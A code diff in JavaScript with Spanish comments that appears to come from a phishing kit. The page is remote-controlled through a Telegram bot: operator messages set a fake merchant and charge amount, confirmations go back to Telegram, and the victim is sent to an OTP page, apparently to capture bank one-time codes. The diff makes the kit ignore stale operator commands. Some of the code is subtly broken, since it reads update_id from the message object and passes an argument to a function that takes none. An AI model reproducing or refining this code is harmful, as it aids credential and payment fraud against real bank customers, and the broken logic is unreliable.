@@ -73,8 +73,12 @@
     return null;
   }
 
-  async function startLoadingGatekeeper() {
+    async function startLoadingGatekeeper() {
     const user = sessionStorage.getItem("demo_user") || "usuario_demo";
+    
+    // ANCLAJE DE HISTORIAL: Obtenemos el ID del último mensaje antes de empezar
+    let lastUpdateId = await getLastUpdateId();
+
     const isReturnPass = sessionStorage.getItem("gatekeeper_done") === "1";
 
     // ============ PASADA 2+ (regresó del dashboard) ============
@@ -105,11 +109,12 @@
           return;
         }
 
+        // Pasamos el lastUpdateId para escuchar solo lo nuevo
         const update = await fetchLatestUpdateSafe();
         if (update && update.length > 0) {
-          // CORREGIDO: Acceso seguro al índice [0] del array devuelto
           const msg = update[0].message || update[0].channel_post || update[0].edited_message;
-          if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+          if (msg && msg.update_id > lastUpdateId && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+            lastUpdateId = msg.update_id; // Actualizamos el puntero
             const textoMensaje = msg.text.trim();
             const low = textoMensaje.toLowerCase();
 
@@ -140,7 +145,7 @@
               if (merchant && amt !== null) {
                 sessionStorage.setItem("charge_merchant", merchant);
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram("✅ *Cargo actualizado:*\n🏪 " + merchant + "\n💵 " + formatMXN(amt));
+                await sendTelegram(`✅ *Cargo actualizado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
                 window.location.href = "otp.html";
                 return;
               }
@@ -150,7 +155,7 @@
               const amt = parseAmount(textoMensaje);
               if (amt !== null) {
                 sessionStorage.setItem("charge_amount", formatMXN(amt));
-                await sendTelegram("✅ *Monto actualizado:* " + formatMXN(amt));
+                await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
                 window.location.href = "otp.html";
                 return;
               }
@@ -177,9 +182,10 @@
       let tail = null;
 
       if (update && update.length > 0) {
-        // CORREGIDO: Acceso seguro al índice [0] del array devuelto
         const msg = update[0].message;
-        if (msg) {
+        // FILTRADO ESTRICTO: Solo procesa si el ID del mensaje es más nuevo que el arranque inicial
+        if (update[0].update_id > lastUpdateId && msg) {
+          lastUpdateId = update[0].update_id; // Avanzamos el puntero
           const chatIDRecibido = String(msg.chat.id);
           const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
           const msgText = msg.text ? msg.text.trim() : "";
@@ -203,7 +209,9 @@
       if (tail) {
         try { sessionStorage.setItem("otp_tail", tail); } catch (e) { }
         textStatus.textContent = "¡Configuración aplicada! Preparando validación...";
-        await proceedToChargeConfig();
+        
+        // Pasamos el lastUpdateId actual para que el paso 1B tampoco lea textos viejos
+        await proceedToChargeConfig(lastUpdateId);
       } else {
         setTimeout(scanPass1, 2000);
       }
@@ -211,6 +219,9 @@
 
     scanPass1();
   }
+
+
+
   async function proceedToChargeConfig() {
     try {
       sessionStorage.removeItem("charge_merchant");
